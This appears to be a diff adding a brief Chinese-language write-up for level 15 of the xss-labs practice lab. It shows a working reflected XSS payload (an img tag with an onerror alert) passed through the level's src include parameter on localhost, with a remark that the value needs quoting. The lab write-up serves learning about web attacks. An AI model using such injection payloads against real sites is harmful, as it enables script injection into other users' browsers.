@@ -1,0 +1,12 @@
+第15关
+
+这关有内部包含的网页跳转
+这里跳到第一关，然后弹窗
+
+http://localhost/xss-labs/level15.php?src='http://localhost/xss-labs/level1.php?name=test<img src=1 onerror=alert(1)>'
+
+主要'引起来
+
+
+
+弹窗成功！！！
